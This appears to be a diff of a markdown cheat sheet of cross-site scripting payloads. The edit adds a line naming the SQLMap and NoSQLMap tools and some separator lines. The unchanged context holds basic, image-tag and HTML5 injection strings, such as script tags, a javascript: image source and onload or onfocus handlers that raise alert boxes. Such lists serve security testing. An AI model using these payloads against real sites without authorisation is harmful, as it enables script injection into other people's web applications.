@@ -17,7 +17,10 @@ Available for manipulation:
 3.Connectivity  
 4.Async JS requests  
 
+Toolset: SQL Map, NoSQLMAP <br />
+
 Basic payload:
+-----------------------------------------------------------------------------
 ```
 ';alert('xss inj');' 
 <script>alert('xss inj')</script>
@@ -31,6 +34,7 @@ Basic payload:
 ```
 
 Image payload:
+-----------------------------------------------------------------------------
 ```
 <img src="javascript:alert('xss inj');">
 <img """><script>alert("xss inj")</script>">
@@ -40,6 +44,7 @@ Image payload:
 ```
 
 HTML5 payload:
+-----------------------------------------------------------------------------
 ```
 <body onload=alert(/xss/.source)>
 <select autofocus onfocus=alert('xss inj')>
